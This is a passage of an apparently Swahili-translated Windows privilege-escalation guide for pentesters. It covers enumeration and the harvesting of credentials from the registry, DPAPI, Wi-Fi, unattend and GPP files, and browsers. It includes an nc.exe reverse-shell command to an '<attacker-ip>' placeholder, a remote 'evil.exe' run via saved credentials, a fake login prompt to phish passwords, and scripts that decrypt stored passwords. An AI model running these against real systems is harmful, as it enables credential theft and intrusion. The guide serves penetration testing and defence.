### Drivers

Tafuta madereva ya **third party ya ajabu/hatari** zinazoweza kuwa na udhaifu.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Ikiwa una **idhini za kuandika ndani ya folda iliyopo kwenye PATH** unaweza kuwa na uwezo wa kuhamasisha DLL inayopakuliwa na mchakato na **kuinua mamlaka**.

Angalia idhini za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia udhibiti huu:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Kushiriki
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kwa kompyuta nyingine zinazojulikana zilizowekwa kwenye faili la hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces za Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Angalia **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Mwelekeo
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, tengeneza sheria, zima, zima...)**

Zaidi[ ya amri za kuhesabu mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` inaweza pia kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata mtumiaji wa root unaweza kusikiliza kwenye bandari yoyote (wakati wa kwanza unapotumia `nc.exe` kusikiliza kwenye bandari itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault inahifadhi akauti za mtumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza **kuingia kwa watumiaji kiotomatiki**. Katika hali ya kwanza, hii inaweza kuonekana kama sasa watumiaji wanaweza kuhifadhi akauti zao za Facebook, akauti za Twitter, akauti za Gmail n.k., ili waingie kiotomatiki kupitia vivinjari. Lakini si hivyo.

Windows Vault inahifadhi akauti ambazo Windows inaweza kuingia kwa watumiaji kiotomatiki, ambayo inamaanisha kwamba **programu yoyote ya Windows inayohitaji akauti ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** & Windows Vault na kutumia akauti zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila wakati.

Ili programu ziweze kuingiliana na Credential Manager, sidhani kama inawezekana kwao kutumia akauti za rasilimali fulani. Hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na meneja wa akauti na kuomba akauti za rasilimali hiyo** kutoka kwenye vault ya uhifadhi wa kawaida.

Tumia `cmdkey` kuorodhesha akauti zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia akidi zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia sehemu ya SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya akidi zilizotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** inatoa njia ya usimbaji wa data wa simetriki, hasa inayotumika ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji wa funguo za kibinafsi zisizo za simetriki. Usimbaji huu unatumia siri ya mtumiaji au mfumo kuchangia kwa kiasi kikubwa katika entropy.

**DPAPI inaruhusu usimbaji wa funguo kupitia funguo za simetriki ambazo zinatokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji wa mfumo, inatumia siri za uthibitishaji wa kikoa cha mfumo.

Funguo za RSA za mtumiaji zilizohifadhiwa, kwa kutumia DPAPI, zinahifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Identifier ya Usalama](https://en.wikipedia.org/wiki/Security_Identifier) wa mtumiaji. **Funguo ya DPAPI, iliyoko pamoja na funguo kuu inayolinda funguo za kibinafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida ina bytes 64 za data za nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umewekwa vizuizi, kuzuia orodha ya yaliyomo kupitia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na hoja sahihi (`/pvk` au `/rpc`) ili kuifungua.

Faili za **akisi zilizolindwa na nenosiri kuu** kwa kawaida zinapatikana katika:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kufungua.\
Unaweza **kuchota DPAPI nyingi** **masterkeys** kutoka **kumbukumbu** kwa kutumia moduli `sekurlsa::dpapi` (ikiwa wewe ni root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** mara nyingi hutumiwa kwa ajili ya **scripting** na kazi za automatisering kama njia ya kuhifadhi akiba za siri zilizofichwa kwa urahisi. Akiba hizo zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza kufunguliwa tu na mtumiaji yule yule kwenye kompyuta ile ile ambayo zilitengenezwa.

Ili **kufungua** akiba za PS kutoka kwa faili inayozihifadhi unaweza kufanya:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Recently Run Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja ya Akiba ya Kitambulisho cha Desktop ya Kijijini**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia moduli ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kufungua faili zozote za .rdg**\
Unaweza **kuchota funguo nyingi za DPAPI** kutoka kwenye kumbukumbu kwa kutumia moduli ya Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Watu mara nyingi hutumia programu ya StickyNotes kwenye vituo vya Windows kuhifadhi **nywila** na taarifa nyingine, bila kujua ni faili ya database. Faili hii iko katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha nywila kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya kiwango cha Juu cha Uaminifu.**\
**AppCmd.exe** iko katika saraka ya `%systemroot%\system32\inetsrv\` .\
Ikiwa faili hii ipo basi inawezekana kwamba baadhi ya **akidi** zimewekwa na zinaweza **kurejeshwa**.

Huu ni msimbo uliochukuliwa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` inapatikana.\
Wakati wa kufunga, **zinakimbizwa na ruhusa za SYSTEM**, nyingi zina udhaifu wa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Usajili (Akida)

### Akida za Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys zinaweza kuhifadhiwa ndani ya funguo za registry `HKCU\Software\OpenSSH\Agent\Keys` hivyo unapaswa kuangalia kama kuna kitu chochote cha kuvutia huko:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata ingizo lolote ndani ya njia hiyo, huenda likawa funguo ya SSH iliyohifadhiwa. Inahifadhiwa kwa njia ya usimbaji lakini inaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haiko inafanya kazi na unataka ianze kiotomatiki wakati wa kuanzisha, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> Inaonekana kwamba mbinu hii si halali tena. Nilijaribu kuunda funguo za ssh, kuziongeza na `ssh-add` na kuingia kupitia ssh kwenye mashine. Usajili HKCU\Software\OpenSSH\Agent\Keys haupo na procmon haikugundua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizo sawa.

### Faili zisizo na mtu
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Hati za Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Cached GPP Pasword

Kipengele kilikuwa kinapatikana hapo awali ambacho kiliruhusu usambazaji wa akaunti za wasimamizi wa ndani za kawaida kwenye kundi la mashine kupitia Mipangilio ya Kundi (GPP). Hata hivyo, njia hii ilikuwa na mapungufu makubwa ya usalama. Kwanza, Vitu vya Mipangilio ya Kundi (GPOs), vilivyohifadhiwa kama faili za XML katika SYSVOL, vinaweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia funguo ya kawaida iliyoorodheshwa hadharani, zinaweza kufichuliwa na mtumiaji yeyote aliyeidhinishwa. Hii ilileta hatari kubwa, kwani inaweza kuruhusu watumiaji kupata haki za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa kutafuta faili za GPP zilizohifadhiwa kwa ndani ambazo zina uwanja wa "cpassword" usio tupu. Punde tu inapo pata faili kama hiyo, kazi hiyo inafichua nywila na inarudisha kitu maalum cha PowerShell. Kitu hiki kinajumuisha maelezo kuhusu GPP na mahali ambapo faili hiyo iko, kusaidia katika kutambua na kurekebisha udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa ajili ya faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili kufichua cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config wenye akidi:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Magogo
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba taarifa za kuingia

Unaweza kila wakati **kuomba mtumiaji aingize taarifa zake za kuingia au hata taarifa za mtumiaji mwingine** ikiwa unafikiri anaweza kujua hizo (zingatia kwamba **kuomba** mteja moja kwa moja kwa **taarifa za kuingia** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na akidi**

Faili zinazojulikana ambazo zamani zilikuwa na **nywila** katika **maandishi wazi** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Unapaswa pia kuangalia Bin kutafuta akiba ndani yake

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Funguo zingine zinazowezekana za registry zenye akiba**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Toa funguo za openssh kutoka kwenye rejista.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia kwa dbs ambapo nywila kutoka **Chrome au Firefox** zimehifadhiwa.\
Pia angalia historia, alama na vipendwa vya vivinjari ili labda baadhi ya **nywila zimehifadhiwa** huko.

Zana za kutoa nywila kutoka kwa vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Kufuta COM DLL**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu **mawasiliano** kati ya vipengele vya programu za lugha tofauti. Kila kipengele cha COM kinatambuliwa kupitia kitambulisho cha darasa (CLSID) na kila kipengele kinatoa kazi kupitia interface moja au zaidi, zinazotambuliwa kupitia vitambulisho vya interface (IIDs).

Darasa na interfaces za COM zin defined katika rejista chini ya **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na **HKEY\_**_**CLASSES\_**_**ROOT\Interface** mtawalia. Rejista hii inaundwa kwa kuunganisha **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Ndani ya CLSIDs za rejista hii unaweza kupata rejista ya mtoto **InProcServer32** ambayo ina **thamani ya kawaida** inayoelekeza kwenye **DLL** na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **kufuta yoyote ya DLLs** ambazo zitatekelezwa, unaweza **kuinua mamlaka** ikiwa hiyo DLL itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama njia ya kudumu angalia:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa Nywila za Kijeneriki katika Faili na Rejista**

**Tafuta maudhui ya faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta kwenye rejista kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana ambazo zinatafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza plugin hii ili **kutekeleza kiotomati kila moduli ya POST ya metasploit inayotafuta nywila** ndani ya mwathirika.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta kiotomati faili zote zinazokuwa na nywila zilizotajwa katika ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwa mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **majina ya watumiaji** na **nywila** za zana kadhaa ambazo huhifadhi data hii kwa maandiko wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **mchakato unaotendeka kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) kwa **ufikiaji kamili**. Mchakato huo huo **pia unaunda mchakato mpya** (`CreateProcess()`) **kwa ruhusa za chini lakini ukirithi handles zote za wazi za mchakato mkuu**.\
Kisha, ikiwa una **ufikiaji kamili kwa mchakato wa chini wa ruhusa**, unaweza kuchukua **handle wazi kwa mchakato wa ruhusa ulioanzishwa** na `OpenProcess()` na **kuingiza shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zilizoshirikiwa, zinazoitwa **pipes**, zinawezesha mawasiliano ya mchakato na uhamasishaji wa data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kinachowezesha michakato isiyo na uhusiano kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa mteja/server, ambapo majukumu yanafafanuliwa kama **named pipe server** na **named pipe client**.

